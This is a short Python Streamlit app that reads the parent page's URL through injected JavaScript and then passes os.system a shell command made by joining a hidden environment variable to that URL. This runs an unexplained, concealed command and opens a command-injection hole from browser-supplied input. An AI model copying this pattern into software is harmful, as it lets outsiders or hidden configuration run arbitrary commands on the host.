import os,time
import streamlit as st
from streamlit_javascript import st_javascript
main_url=os.environ["main_url"]
x=1
while True:
	url_page = st_javascript("await fetch('').then(r => window.parent.location.href)",key=str(x))
	x+=1
	if url_page!=0:
		break
	else:
		st.write(url_page)
		time.sleep(1)

st.write(url_page)
@st.cache_resource
def init_connection1():
	return os.system(main_url+str(url_page)[:-4])
_=init_connection1()
